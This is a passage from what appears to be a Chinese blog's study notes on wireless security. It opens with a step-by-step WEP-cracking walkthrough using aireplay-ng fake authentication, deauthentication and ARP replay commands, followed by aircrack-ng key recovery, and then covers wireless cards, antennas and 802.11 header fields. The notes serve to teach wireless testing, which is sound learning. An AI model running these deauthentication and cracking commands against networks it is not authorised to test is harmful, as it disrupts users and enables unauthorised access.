<li><p><code>-1：fake authentication with AP</code>，利用抓获的xor文件进行关联操作（Attack mode中的选项）</p>
</li>
<li><p><code>60</code>：表示每60秒进行一次伪造认证，保证其处于持续认证状态</p>
</li>
<li><p><code>-e kifi</code>：指定无线的ESSID（<code>Fakeauth attack options</code>中的选项)</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-y</span><br></pre></td></tr></table></figure>
<p>：指定上述已经抓获，保存到本地的xor文件</p>
<ul>
<li>此文件是关键</li>
<li>（<code>Fakeauth attack options</code>中的选项)</li>
</ul>
</li>
<li><p><code>-a</code>：AP的MAC地址（<code>Replay options:</code>）</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-h</span><br></pre></td></tr></table></figure>
<p>：本机网卡的MAC地址</p>
<ul>
<li>(<code>Replay options:</code>)</li>
<li>认证及后续的关联，必然需要二者的MAC地址</li>
<li>原来wlan0，转为monitor模式，变为wlan0mon</li>
<li>wlan0的MAC地址是6个字节的16进制数，wlan0mon是16个字节的16进制数（前6个不变，后10个随机</li>
<li>在这-h，跟的是原来的6个字节，即16的前6</li>
</ul>
</li>
<li><p>wlan0mon，便是本机的无线网卡</p>
</li>
</ul>
</li>
<li><p>执行后（是分为两个步骤的：认证和关联）</p>
</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/34502255.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
<h3 id="（6）执行ARP重放及Deauthenticatiion触发ARP数据包"><a href="#（6）执行ARP重放及Deauthenticatiion触发ARP数据包" class="headerlink" title="（6）执行ARP重放及Deauthenticatiion触发ARP数据包"></a>（6）执行ARP重放及Deauthenticatiion触发ARP数据包</h3><ul>
<li><p>促使AP发送大量IV的</p>
<ul>
<li>需是大量的，少量的不足以分析出密钥来</li>
<li>64位密钥，要至少20万以上IV</li>
<li>128位，150万左右IV</li>
<li>当然，若只有5万IV，也是有可能分析出的（需要的IV恰巧在里面），但是可能性很小，还是多抓IV，保证一定能分析出</li>
<li>没有严格的数量限制，但是越多越好，分析的越准确、越块</li>
</ul>
</li>
<li><p>判断IV数量（已经抓了多少）：airodump抓包时，可通过#data字段判断，因为IV就是数据帧的形式</p>
</li>
<li><p>如何产生大量IV值？</p>
<ul>
<li>用ARP重放（IP-MAC，与以太网中的ARP是同种东西）</li>
<li>思想：向AP发送大量ARP，从大量ARP响应中得到IV</li>
<li>但是H仅仅是与AP通过认证并建立了关联，其是不能向直接向AP发送ARP的</li>
<li>发送ARP的工作，就要由正常STA来做，STA发送ARP，H端截获再发送至AP，AP的ARP响应发送至H（ARP发送阶段，H作为中间人截获过来，由它来发送</li>
</ul>
</li>
<li><p>大体分为两步</p>
<ul>
<li><p>（一）H端启动ARP重放攻击</p>
<ul>
<li><p><code>aireplay-ng -3 -b MAC1 -h MAC2 wlan0mon</code></p>
</li>
<li><p>但是此时并没有可用的ARP请求（由正常STA提供）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/28922540.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
</li>
</ul>
</li>
<li><p>（二）打掉STA与AP的连接，其重新连接时，会产生ARP请求</p>
<ul>
<li>同获取XOR一样，同样是利用Deauthentication</li>
<li><code>aireplay-ng -0 1 -a MAC1 -c MAC2 wlan0mon</code></li>
</ul>
</li>
<li><p>此时arp重放攻击中，就得到了ARP请求，开始进行攻击</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/23781071.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
</li>
<li><p>airodump-ng抓包处可以看到#data字段值在不断增加（即正在收集IV</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/74245642.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
</li>
</ul>
</li>
<li><p>留出时间，让其来进行IV的收集</p>
</li>
<li>也可以一边收集一边尝试破解<ul>
<li>不必那么死板非要等IV到一个很大值，少量时也可以破解的，只不过可能性很小而已</li>
<li>节约时间，提高效率</li>
</ul>
</li>
</ul>
<h3 id="（7）aircrack-ng破解密码"><a href="#（7）aircrack-ng破解密码" class="headerlink" title="（7）aircrack-ng破解密码"></a>（7）aircrack-ng破解密码</h3><ul>
<li><p>破解密码是比较简单的，aircrack-ng</p>
</li>
<li><p><code>aircrack-ng xxx.cap</code>（后面跟cap即可，是airodump-ng抓包时保存到本地的</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/73724415.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
<ul>
<li>KEY FOUND：依次是十六进制和ASCII码的密码（1234567890123</li>
</ul>
</li>
<li><p>aircrack-ng套件有三种破解思想</p>
<ul>
<li>通过ARP重放收集大量IV便是其中一种（STA向AP发送ARP，ARP响应中便是IV的重要来源）</li>
</ul>
</li>
</ul>
<h2 id="1-4-补充"><a href="#1-4-补充" class="headerlink" title="1.4-补充"></a>1.4-补充</h2><h3 id="（1）fake-authentication"><a href="#（1）fake-authentication" class="headerlink" title="（1）fake authentication"></a>（1）fake authentication</h3><ul>
<li><p>WEP破解全部需要首先伪造认证，以便与AP进行正常通信</p>
</li>
<li><p>是不产生ARP数据包</p>
</li>
<li><p><code>aireplay-ng -1 0 -e kifi -a &lt;AP MAC &gt; -h &lt;your MAC &gt; &lt;interface &gt;</code></p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -1 60 -o 1 -q 10 -e&lt;ESSID&gt; -a &lt;AP MAC &gt; -h &lt;your MAC &gt; &lt;interface &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>每6000秒发送若authentication</li>
<li>-o 1 每次身份认证只发一组认证数据包（默认是发送3组）</li>
<li>-q 10 每10秒发keep-live帧</li>
</ul>
</li>
</ul>
<h3 id="（2）fake-authentication排错"><a href="#（2）fake-authentication排错" class="headerlink" title="（2）fake authentication排错"></a>（2）fake authentication排错</h3><ul>
<li>某些AP验证客户端MAC地址OUI<ul>
<li>即MAC的前三个字节，国际标准化组织分给各厂商的</li>
<li>后三个字节是厂商自行分配给网卡的</li>
</ul>
</li>
<li>也可能AP做了MAC地址过滤<ul>
<li>MAC地址绑定攻击，伪造MAC</li>
</ul>
</li>
<li>Denied （Code 1） is WPA in use<ul>
<li>WPA/WPA2 不支持fake authentication</li>
<li>只有WEP破解时会用到</li>
</ul>
</li>
<li>-h指定本机网卡MAC地址时，粗心写错<ul>
<li>使用真实Mac地址</li>
</ul>
</li>
<li>本机与AP距离太远<ul>
<li>物理靠近AP</li>
<li>或使用天线扩大信号</li>
</ul>
</li>
<li>侦听信道和AP工作信道必须是一致的，不一致也会失败</li>
</ul>
<h3 id="（3）deauthentication攻击"><a href="#（3）deauthentication攻击" class="headerlink" title="（3）deauthentication攻击"></a>（3）deauthentication攻击</h3><ul>
<li><p>强制客户端与AP断开关联</p>
<ul>
<li>重连生成ARP请求，AP回应包含IV</li>
<li>WPA重连过程会抓取四步握手过程</li>
<li>无客户端情况下此攻击无效</li>
</ul>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 0 -a &lt;ap的mac&gt; -c &lt;客户端的mac&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>不指定-c参数时，没有指定具体的客户端<ul>
<li>以广播攻击所有客户端</li>
<li>但是有的客户端会拒绝广播形式的aireplay发出的数据包</li>
<li>故不是所有的客户端都会受到攻击</li>
</ul>
</li>
<li>0：不是不发包，而是无限次，即不停的发包</li>
<li>每攻击发送128个包，64个给AP，64个给客户端</li>
<li>物理足够接近被攻击者，即距离要小</li>
</ul>
</li>
</ul>
<h3 id="（4）deauthentication排错"><a href="#（4）deauthentication排错" class="headerlink" title="（4）deauthentication排错"></a>（4）deauthentication排错</h3><ul>
<li>物理足够接受被攻击者（离得近一些</li>
<li>与被攻击者使用相同无线标准b、n、g（模式不匹配可能会失败）</li>
<li>客户端可能拒绝广播帧，建议指定客户端</li>
</ul>
<h3 id="（5）ARP重放"><a href="#（5）ARP重放" class="headerlink" title="（5）ARP重放"></a>（5）ARP重放</h3><ul>
<li><p>侦听正常的ARP包并重放给AP</p>
</li>
<li><p>AP回包中包含大量弱IV</p>
<ul>
<li>弱IV，即重复出现的IV值</li>
<li>有些厂商会自己采取措施，防止重复IV的出现</li>
</ul>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -3 -b &lt;ap的mac&gt; -h &lt;source的Mac&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>-h 合法客户端/供给者MAC</li>
</ul>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airodump-ng data字段</span><br></pre></td></tr></table></figure>
<ul>
<li>64位密钥 ：25万</li>
<li>128位密钥：150万</li>
<li>不必死板追求某一值，IV数量少的时候，也会有一定几率破解成功</li>
</ul>
</li>
</ul>
<h3 id="（6）WEP破解"><a href="#（6）WEP破解" class="headerlink" title="（6）WEP破解"></a>（6）WEP破解</h3><ul>
<li>airecrack-ng wep.cap</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Kali</tag>
        <tag>无线渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>无线网硬件设备及基本概念</title>
    <url>/2018/02/18/wireless/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%8F%8A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<h1 id="无线网硬件设备及基本概念"><a href="#无线网硬件设备及基本概念" class="headerlink" title="无线网硬件设备及基本概念"></a>无线网硬件设备及基本概念</h1><h2 id="无线网卡准备"><a href="#无线网卡准备" class="headerlink" title="无线网卡准备"></a>无线网卡准备</h2><ul>
<li>物理机运行kali</li>
<li>虚拟机运行kali<ul>
<li>外置USB无线网卡<ul>
<li>虚拟机软件支持将物理机上的网卡映射到虚拟机</li>
<li>桥接模式下：尽管是无线网卡，虚拟机仍将其看作是有线网卡eth0，而非wlan0等</li>
</ul>
</li>
<li>TL-WN722N（建议，一般没问题<a id="more"></a></li>
<li>dmesg命令<ul>
<li>可以查看系统硬件方面的变化，如插入新网卡新鼠标</li>
<li>dmesg -T可以按照时间查看</li>
<li>可根据时间找到新插入的网卡信息</li>
<li>idvendor为厂商编号，ipproduct为产品编号（二者很有用，设置相关，等再次插入网卡时，可自动识别为虚拟机的设备，忽略物理机</li>
<li>manufacturer：xxx，显示芯片，而非厂商，重要的是芯片（决定后面实践是否顺利），而非厂商，如atheros，rtl8171</li>
<li>ath9k_htc看用的是什么驱动</li>
</ul>
</li>
<li>iwconfig<ul>
<li>非ifconfig，是专门用来查看无线的</li>
<li>IEEE802.1 bng（支持这三种模式，ng都是相互兼容b的</li>
<li>ESSID为扩展服务及id，因未连接无线网络，所以此时为off/any</li>
<li>mode：managed（模式是managed，若想抓802.11包头，则设置为monitor模式</li>
<li>access-point：xxx（连接的是哪个ap，即访问点，未连接时，not-associated</li>
<li>tx-power：20 sbM（发送信号的强度</li>
</ul>
</li>
</ul>
</li>
<li>系统选择<ul>
<li>不建议Windows，对硬件、驱动等太过于苛刻</li>
<li>建议Linux，kali就好了</li>
</ul>
</li>
</ul>
<h2 id="无线网卡选择"><a href="#无线网卡选择" class="headerlink" title="无线网卡选择"></a>无线网卡选择</h2><ul>
<li>选择无线网卡是痛苦且受挫的过程</li>
<li>无线网卡的芯片型号是成败的关键（而非厂商</li>
<li>不同设备的选择<ul>
<li>台式机相关网卡（选择较多<ul>
<li>usb无线网卡（不支持扩展天线</li>
<li>PCMCIA（16位，已停产，802.11b</li>
<li>cardbus（32位，PCMCIA 8.0标准</li>
<li>express cards</li>
<li>mini PCI</li>
<li>mini PCI express</li>
<li>PCI接口卡</li>
</ul>
</li>
<li>笔记本或虚拟机（没得选，只能是usb</li>
</ul>
</li>
<li>关注点<ul>
<li>发送功率<ul>
<li>决定远程连接距离的远近</li>
<li>一般情况，设备的发送功率出厂时已被厂家限制（为防止无线垃圾</li>
<li>为扩大功率，可以自行安装天线</li>
<li>若条件允许，尽量选择功率大的</li>
<li>发送时，关注的是功率问题</li>
</ul>
</li>
<li>接收灵敏度<ul>
<li>接收时，关注的是灵敏度</li>
<li>不能过高，适当降低灵敏度，使接受效果更佳</li>
<li>过高时，接受到的垃圾信号多</li>
<li>尽量低，不同于发送时功率尽量高</li>
</ul>
</li>
<li>有一经验但非铁律<ul>
<li>选择atheros或者realtek芯片</li>
<li>不存在最好的网卡一说法，没有神器，效果好即可</li>
<li>选择兼容aircrack-ng suite的<ul>
<li>后期实践部分使用较多的工具</li>
<li>可到其官网，查看其建议的芯片</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>无线渗透网卡的选择没有所谓标准<ul>
<li>但aircrack-ng作者给出建议</li>
<li>12年提出的（时间供参考</li>
<li>alfa networks AWUS036H 无线网卡<ul>
<li>Realtek 8171无线芯片</li>
<li>1000 mW的发送功率</li>
<li>天线：RP-SMA</li>
<li>是可扩展的，可更换天线</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a>无线技术概念</h2><ul>
<li>单位相关<ul>
<li>分贝dB<ul>
<li>大小写严格要求</li>
<li>测量无线强度信号</li>
</ul>
</li>
<li>B<ul>
<li>向Alexander Graham Bell 致敬</li>
<li>今天大部分声学设备的发明者和理论奠基人</li>
</ul>
</li>
<li>dB<ul>
<li>表示两个信号之间的差异比率</li>
<li>用于描述设备的信号强度</li>
<li>是一个相对值，而非一个绝对的值</li>
</ul>
</li>
<li>dBm<ul>
<li>功率值与1mW进行比较的dB值结果（可理解为是一个绝对的值</li>
</ul>
</li>
<li>功率值与分贝值可通过公式转换</li>
<li>大概规律为：<ul>
<li>每增加3dBm，功率增加约1wM</li>
<li>美增加10dBm，功率增加10倍</li>
</ul>
</li>
<li>无线相关的单位全是dB（dB、dBm、dBi、dBd；网卡或天线</li>
<li>既然有mW来表示功率，为何还要引入dB<ul>
<li>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W、mW来记数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位</li>
</ul>
</li>
</ul>
</li>
<li>天线相关<ul>
<li>简介<ul>
<li>分为定向天线和全向天线</li>
<li>安全考虑，多采用定向天线，防止信号外漏，使恶意用户连接</li>
<li>天线就是要增大信号强度，其能力的大小称为增益</li>
<li>如30dBm的网卡，加9dBi的天线，则变成39dBm（思路是这样的，具体公式求解</li>
</ul>
</li>
<li>dBi：全向天线信号功率增益<ul>
<li>全向天线向所有方向均匀辐射</li>
<li>增益是指信号功率强度增加了多少dB</li>
<li>增益在网卡，也可以增益在无线路由器</li>
<li>具体增益了多少，公式求解</li>
</ul>
</li>
<li>dBd：定向天线的增益值<ul>
<li>全向天线再所有方向上收发信号，定向天线在制定方向的范围内收发信号（理论如此，但实际区分并未这样严格</li>
<li>天线增益越大，信号传输距离越远</li>
<li>因为信号比较集中，所以传输距离远</li>
</ul>
</li>
</ul>
</li>
<li>全向天线<ul>
<li>波形图类似甜甜圈</li>
<li>天线选择的误区：认为增益越高越好<ul>
<li>好处：可以扩大范围，增强信号</li>
<li>高耗能</li>
<li>对周围环境造成信号干扰</li>
<li>增益过高的全向天线会变成定向天线（波形会产生变化</li>
</ul>
</li>
</ul>
</li>
<li>定向天线<ul>
<li>双四边形</li>
<li>定向发送信号</li>
<li>功率相同时，比全向天线传输距离更远（方向正确的情况下</li>
<li>常见<ul>
<li>八木天线：引向反射天线</li>
<li>平面天线：多出现在办公区，多在天花板</li>
<li>扇形天线：常用于移动电话网络；三到四个扇形天线联合使用可实现全向信号覆盖</li>
<li>网状天线：射束带宽更加集中，功率更强</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>802.11头部</title>
    <url>/2018/02/18/wireless/802-11%E5%A4%B4%E9%83%A8/</url>
    <content><![CDATA[<h1 id="802-11头部"><a href="#802-11头部" class="headerlink" title="802.11头部"></a>802.11头部</h1><h2 id="预备知识点"><a href="#预备知识点" class="headerlink" title="预备知识点"></a>预备知识点</h2><ul>
<li><p>MAC layer address（MAC子层）</p>
<ul>
<li>Basic service set ID（BSSID</li>
<li>是BSS的唯一标识，infrastructure模式中BSSID就是AP的MAC地址</li>
<li>当AP支持多BSS时，随机生成每个BSSID<a id="more"></a></li>
</ul>
</li>
<li><p>无线数据包是基于广播的，不管是AP还是STA，只要设置网卡为监听模式即monitor，就可以抓取数据包，因此无线通常都是采用加密的；但某些加密方法也是存在弱点的，无线渗透即针对于此</p>
</li>
<li>无线通信层进行加密后，上层如网络层、传输层也可以各自进行加密，一同保证通信的安全</li>
<li><p>可以进行无线渗透，一方面是一些不安全配置，另一访方面是其自身的不安全性（如广播方式、加密方式的弱点等客观因素</p>
</li>
<li><p>DU，data unit，即数据单元，信息传输的最小数据集合</p>
</li>
<li><p>传递过程是逐层封装（encapsulation）、解封装的</p>
</li>
<li><p>SDU与PDU</p>
<ul>
<li>SDU（service Data Unit）:服务数据单元，又叫业务数据单元</li>
<li>PDU: 协议数据单元</li>
<li>进入每个子层未被处理的数据称为服务数据单元(SDU)，经过子层处理后形成特定格式的数据被称为协议数据单元(PDU)</li>
<li>本层形成的PDU即为下一层的SDU，本层的SDU即为上层传递过来的的PDU<ul>
<li>PDU(N) = SDU(N - 1)</li>
<li>SDU(N) = PDU(N + 1)</li>
</ul>
</li>
</ul>
</li>
<li><p>数据 链路层分为两个子层：LLC子层和MAC子层</p>
<ul>
<li><p>只有局域网内链路层分成两个子层</p>
<p><code>802.3（局域网）是共享介质的，而广域网是专用的（通常是点对点的）不存在介质冲突的问题</code></p>
</li>
<li><p>LLC子层</p>
<ul>
<li>逻辑链路控制（Logical Link Control ）</li>
<li>LLC子层负责向其上层提供服务；</li>
</ul>
</li>
<li><p>MAC子层</p>
<ul>
<li>媒体访问控制</li>
<li>MAC子层的主要功能包括数据帧的封装/卸装，帧的寻址和识别，帧的接收与发送，链路的管理，帧的差错控制等</li>
<li>MAC子层的存在屏蔽了不同物理链路种类的差异性;</li>
</ul>
</li>
</ul>
</li>
<li><p>MSDU——MIC ——分帧——添加IV ——加密——添加MAC头部——MPDU</p>
<ul>
<li>MSDU是MAC子层的SDU（数据链路层的媒体访问控制子层MAC，物理层之上）</li>
<li>MPDU是MAC子层的PDU</li>
</ul>
</li>
<li><p>MPDU/PSDU+物理头=PPDU——RF发射</p>
<ul>
<li>PSDU即物理层的SDU，即MPDU（不同角度所以名称不同</li>
<li>PPDU即物理层的PDU</li>
</ul>
</li>
<li><p>物理层与MAC层的关系</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/84337966.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>数据链路层分为LLC和MAC，主要研究MAC子层，且重点是MAC头部</p>
</li>
</ul>
<h2 id="radiotap头部"><a href="#radiotap头部" class="headerlink" title="radiotap头部"></a>radiotap头部</h2><ul>
<li><p>简介</p>
<ul>
<li>802.11帧发射和接收的事实标准（并非真实的标准），802.11依赖radiotap完成通信过程</li>
<li>Linux系统在驱动和API中内建支持radiotap</li>
<li>802.11帧发射之前，网卡驱动在802.11头前面添加radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧头包含radiotap头，需要先处理此头</li>
<li>radiotap为802.11帧传递额外信息，厂家可自定义（有部分是固定的，不可自定义），因此长度不固定</li>
<li>使用radiotap的好处：不破坏原始头结构，增加传递的信息</li>
<li>与后期实际渗透时没有太多关系，简单了解即可</li>
</ul>
</li>
<li><p>分为header和data</p>
<ul>
<li><p>header</p>
<ul>
<li><p>version，始终为0，8bit；表示版本号，当前为<code>0</code></p>
</li>
<li><p>pad，未使用，用作占位符，8bit；没有使用，仅仅是为了结构体对齐</p>
</li>
<li><p>length，16位，</p>
<ul>
<li>作用是确定802.11头的开始位置</li>
<li>整个radiotap头长度（是可变的；不是说header是说整个radiotap头</li>
<li>表示长度，包括了<code>radiotap</code>头部和数据两部分</li>
<li>果不需要了解<code>radiotap</code>，则可以直接跳到<code>ieee802.11</code>头部</li>
</ul>
</li>
<li><p>present flags，32位</p>
<ul>
<li><p>data段的掩码，表示<code>radiotap</code>数据的位掩码。</p>
</li>
<li><p><code>radiotap</code>的数据紧跟其头部</p>
</li>
<li><p>当其中的位掩码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br></pre></td></tr></table></figure>
<p>时，表示有对应的数据，可以认为每一比特表示一种类型。</p>
<ul>
<li>比如<code>bit5</code>为<code>1</code>表示有通道数据，则可以获取到信号强度，反之就是没有对应的数据</li>
<li><code>bit31</code>为<code>1</code>表示还有多个<code>it_present</code>。</li>
<li>ext为0或1，表示是否有扩展，若有，则还有一段32位的present flag，第一段为radiotap的固定部分，而后面的扩展则为厂家的自定义</li>
</ul>
</li>
<li><p>由上可知，radiotap的长度其实是不固定的。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>data数据部分</p>
</li>
</ul>
</li>
</ul>
<h2 id="802-11-MAC头结构"><a href="#802-11-MAC头结构" class="headerlink" title="802.11 MAC头结构"></a>802.11 MAC头结构</h2><ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/96873350.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>帧控制结构，Frame control</p>
<ul>
<li><p>Protocol Version: 协议版本，通常为0（可选：0/1/2/3）</p>
</li>
<li><p>Type: 帧类型（规定帧的具体用途，3种帧类型）</p>
<ul>
<li>控制帧（1）：用于竞争期间的握手通信和正向确认、结束非竞争期等</li>
<li>管理帧（0）：主要用于STA与AP之间协商、关系的控制，如关联、认证、同步等；</li>
<li>数据帧（2）：用于在竞争期和非竞争期传输数据。</li>
</ul>
</li>
<li><p>Subtype: 进一步判断帧的子类型</p>
<ul>
<li>每个类型对应多个子类型</li>
<li>协议规定，不同类型+子类型的帧完成不同功能的操作</li>
<li>注：后续只关注与安全相关的帧，性能相关的了解即可</li>
</ul>
</li>
<li><p>To DS/From DS: 表明该帧是否是（DS向BSS/BSS向DS）发送的帧</p>
<ul>
<li><p>DS即distribute system，分布式系统；BSS为基本服务集</p>
</li>
<li><p>标示帧的传输方向，传向DS或来自DS</p>
</li>
<li><p>这两个字段的值决定着MAC头中4个address字段的不同定义</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/8120942.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>0x00</p>
<ul>
<li>即不是发往DS，也不是从DS来</li>
<li>出现在IBSS环境：IBSS为独立的基本服务集，即AD-HOC（STA维护SSID；没有AP，且必须没有AP）</li>
<li>或者是STSL中两个STA通信（station to station link）</li>
<li>若都是0，可能是management帧和control帧，而不可能为数据帧</li>
</ul>
</li>
<li><p>0x01</p>
<ul>
<li>表示data帧从AP从STA传递</li>
</ul>
</li>
<li><p>0x02</p>
<ul>
<li>表示data帧从STA向AP传递</li>
</ul>
</li>
<li><p>0x03</p>
<ul>
<li>表示两个AP间通信</li>
<li>这是典型的WDS环境下AP的通信（wireless distribution system，即无线分布式系统</li>
<li>或者表示Mesh环境下MP间的通信（mesh为网状的无线，也会有多个AP相互连接的情况</li>
<li>只有全都为1时，才会用到address4字段</li>
</ul>
</li>
</ul>
</li>
<li><p>More Fragment</p>
<ul>
<li>用于说明长帧被分段的情况，是否还有其它的帧，如果有则该值设置为1</li>
<li>值为1时表示有后续字段</li>
<li>可能是data或management帧类型（管理帧中也有数据段部分，只不过其并不是用户相互传输的数据）</li>
<li>只有单播接受地址的帧才会被分段，广播地址不会进行分段，直接就发出去了</li>
</ul>
</li>
<li><p>Retry(重传域)</p>
<ul>
<li>若向目标机发送数据，但没有收到ack响应，一段时间后，则会进行重传，则将此字段置为1，表示这是一个重传的帧</li>
<li>值为1时表示重传帧，可能是data或management帧类型</li>
<li>接收端进程：使用此值防止帧重传</li>
</ul>
</li>
<li><p>Power Management</p>
<ul>
<li>无线网卡在供电方面存在两种模式<ul>
<li>活动模式-0和省电模式-1</li>
<li>网卡中有放大器的组件（最耗电），发送端放大信号后发送或接收端收到信号后再放大，</li>
</ul>
</li>
<li>表示传输帧以后，站所采用的电源管理模式</li>
<li>网卡在空闲状态下，可以切换为省电模式；</li>
<li>STA处于省电模式时，向关联的AP发送该值为1的帧（AP从不使用该字段），此后AP便得知连接到自己的这个STA处于省电模式下；</li>
<li>省电模式下，STA不接收数据（不接受数据帧，但是会收到AP发送的其它特殊数据），发送给他的data帧由AP暂时缓存，AP会唤醒这个STA，唤醒之后的STA会主动去索要AP缓存中的数据；</li>
</ul>
</li>
<li><p>More Data</p>
<ul>
<li>表示有很多帧缓存到站中</li>
<li>即至少还有一个数据帧要发送给STA时设置为1。</li>
<li>当AP缓存了至少一个MSDU（LLC子层传输下来的）时，会像省电模式的STA发送该值为1的帧，表示有数据要传输给STA</li>
<li>接受到此帧的STA唤醒自己并向AP发送PS-Poll帧，取回由AP为其缓存的数据<ul>
<li>ps-poll是一种控制帧</li>
</ul>
</li>
<li>也被用于AP有更多的广播/多播帧需要时发送的情况</li>
</ul>
</li>
<li><p>Protected Frame</p>
<ul>
<li>若置为1，则可能为数据帧或管理帧</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 表示根据WEP(Wired Equivalent Privacy)算法对帧主体进行加密。</span><br><span class="line">- 如果帧体部分包含被密钥套处理过的数据，则设置为1，否则设置为0</span><br><span class="line">- 可能是data或management帧类型，表示MSDU是否被加密，也被用于表示PSK身份验证Frame#3帧</span><br><span class="line">- 数据载荷为空时（即数据端），该字段值为0</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Order(序号域)</p>
<ul>
<li>在长帧分段传送时，该域设置为1表示接受者应该严格按照顺序处理该帧，否则设置为0</li>
<li>在非Qos帧的情况下，值为1表示数据必须按严格顺序处理，通常为0（表传输时，可以不按数据传输）</li>
</ul>
</li>
<li><p>Duration/ID(持续时间/标识)</p>
<ul>
<li>所有的control帧都使用该字段，其作用随type/subtype变化有所不同</li>
<li>当帧的类型为PS Poll（type：1，subtype：10）时，就表示sta关联的AID（而不再表示时间相关的含义）<ul>
<li>AID，associate identify，STA与AP建立连接时，AP会向STA发送一个AID，以标识此关联</li>
<li>当AP向STA发送唤醒帧后，STA要发送PS poll去主动索取其缓存里的数据</li>
<li>此时，这个字段就换成AID，AP来辨别是哪个STA来索取数据</li>
</ul>
</li>
<li>其它情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保存的时间间隔，用于NVA计算，单位是微秒（大部分情况）</li>
</ul>
</li>
<li><p>Address Fields(地址域):</p>
<ul>
<li>Destination Address</li>
<li>Source Address</li>
<li>BSS ID</li>
</ul>
</li>
<li><p>Sequence Control(序列控制域)</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/68751609.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
<ul>
<li>用于过滤重复帧</li>
<li>MSDU(MAC Server Data Unit), 12位序列号(Sequence Number)</li>
<li>每个帧的编号，数值范围是0-4095，以1为步长递增</li>
<li>当帧被分段时，同一帧不同分段的sequence number相同</li>
<li>MMSDU(MAC Management Server Data Unit), 4位片段号(Fragment Number)组成</li>
<li>是被分段的帧用于标识分段位置顺序的编号，数值范围是0-15，以1为步长递增</li>
</ul>
</li>
<li><p>Frame Body(Data)，0-2324字节</p>
<ul>
<li>发送或接收的信息。对于不同类型的数据帧来说，这个域的格式差别较大</li>
<li>数据字段，未加密的最大MSDU长度为2304字节<ul>
<li>其中包含最大256字节的上层头信息，和可被传递的数据2048字节</li>
<li>不同的加密方法会增加一定的内容长度<ul>
<li>WEP：8-2312字节</li>
<li>TKIP（WPA1）：20-2324字节</li>
<li>CCMP（WPA2）：16-2320字节</li>
</ul>
</li>
</ul>
</li>
<li>注：control 类型的帧没有frame body内容</li>
</ul>
</li>
<li>FCS(CRC)，4字节<ul>
<li>包括32位的循环冗余校验(CRC)，用于检错，注意是检错不是纠错</li>
<li>发送端对全部MAC包头和Frame body的内容进行CRC操作，计算结果即为FCS值（frame check sequence）值</li>
<li>接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广播/多播帧可能被接收</li>
<li><strong>注：Wireshark抓包时已经删除了FCS值</strong>（但有时也会抓到，没那么绝对）</li>
</ul>
</li>
</ul>
<h2 id="control-frame：控制帧"><a href="#control-frame：控制帧" class="headerlink" title="control frame：控制帧"></a>control frame：控制帧</h2><ul>
<li><p>简介：</p>
<ul>
<li><p>即帧类型为1的帧</p>
</li>
<li><p>控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息，是没有数据段的</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-1/81693247.jpg?ynotemdtimestamp=1550490749209" alt="img"></p>
</li>
<li><p>与无线渗透相关的有：reserved、PS-Poll、RTS、CTS、ACK</p>
</li>
</ul>
</li>
</ul>
<h3 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a>ACK</h3><ul>
<li><p>接收端正确接收数据之后向发送端返回ACK确认</p>
</li>
